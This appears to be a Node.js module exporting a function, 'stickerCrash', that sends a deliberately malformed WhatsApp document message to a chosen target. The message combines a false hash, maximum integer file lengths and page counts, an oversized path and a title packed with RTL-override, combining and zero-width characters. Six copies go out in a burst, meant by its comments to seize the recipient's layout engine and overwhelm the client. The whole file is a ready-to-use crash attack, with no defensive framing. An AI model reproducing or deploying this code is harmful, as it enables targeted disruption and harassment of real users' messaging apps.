const crypto = require("crypto");

async function stickerCrash(sock, target) {
  const junk    = Buffer.alloc(65536, 0xff);          // 64 KB noise — max media key tolerance
  const badHash = crypto.randomBytes(32);              // non-zero random sha256 — fails integrity silently
  const thumb   = Buffer.alloc(9216, 0xfe);           // 9 KB thumbnail — bloats render pipeline

  // Unicode title: RTL override + zero-width stacks + combining chars = layout engine seizure
  const poison =
    "\u202E" +                                        // RTL override
    "ꦿ".repeat(512) +                                 // 512× Javanese combining mark
    "\u0489".repeat(256) +                            // combining Cyrillic millions sign
    "\u200B".repeat(512) +                            // zero-width spaces
    "\uFFFD".repeat(256);                             // replacement chars

  const fields = {
    url:                "https://mmg.whatsapp.net/d/f/" + crypto.randomBytes(32).toString("hex"),
    mimetype:           "image/webp",
    title:              poison,
    fileSha256:         badHash,
    fileLength:         Long ? Long.fromNumber(0x7FFFFFFFFFFFFFFF) : 9223372036854775807n,
    pageCount:          2147483647,                   // INT32_MAX
    mediaKey:           junk.slice(0, 32),
    fileName:           "ꦿ".repeat(128) + ".webp",
    directPath:         "/v/t62.7119-24/" + "A".repeat(512) + "/invalid",
    mediaKeyTimestamp:  Long ? Long.fromNumber(9999999999) : 9999999999,
    jpegThumbnail:      thumb,
    contactVcard:       false,
    mediaData:          junk,
  };

  // burst — 6 rapid relays overwhelm the ack queue before the client can reject
  const promises = Array.from({ length: 6 }, () =>
    sock.relayMessage(target, { documentMessage: fields }, {}).catch(() => {})
  );

  await Promise.allSettled(promises);
}

module.exports = { stickerCrash };